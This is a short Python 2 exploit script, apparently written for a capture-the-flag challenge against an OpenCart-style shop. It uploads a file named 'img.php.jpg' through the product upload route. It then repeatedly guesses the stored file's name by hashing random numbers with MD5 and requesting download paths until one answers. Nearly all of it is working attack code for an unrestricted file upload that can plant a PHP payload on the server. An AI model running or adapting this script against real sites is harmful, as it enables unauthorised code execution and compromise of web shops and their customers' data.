#!/usr/bin/python
import requests # for webpage request
import hashlib #to generade md5 hash
import random #to generate random number
import os,sys #to execute shell command

class exp(object):
    upl_file = "img.php.jpg"
    req = requests.session()
    headers={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'}
    #headers={'Content-Type': 'text/xml'}
    url = sys.argv[1]
    def gen_randomstring(self):
        php = 'php -r "echo rand();"'
        return os.popen('php -r "echo rand();"').read()

    def gen_md5(self,str):
        m = hashlib.md5()
        m.update(str)
        return m.hexdigest()

    def run(self):
       self.upload()
       while self.detect():
           self.upload()

    def detect(self):
        rand_str = self.gen_randomstring()
        ul = self.url + "download/" +self.upl_file+"."+self.gen_md5(rand_str)
        print ul
        result = self.req.get(ul, headers=self.headers)
        if result.status_code ==200:
            print "found the flag! congrulation"
            return False
        else:
            print "not found!"
            return True
        
    def upload(self):
        path = os.path.dirname(os.path.realpath(__file__))+"/"+self.upl_file
        files = { 'file': ('img.php.jpg', open('img.php.jpg', 'rb'), 'image/jpeg')}
        par = 'index.php?route=product/product/upload'
        ul = self.url + par
        result = self.req.post(ul,files=files)
        if result.status_code ==200:
            print result.text
            
if __name__ == '__main__':
    exp().run()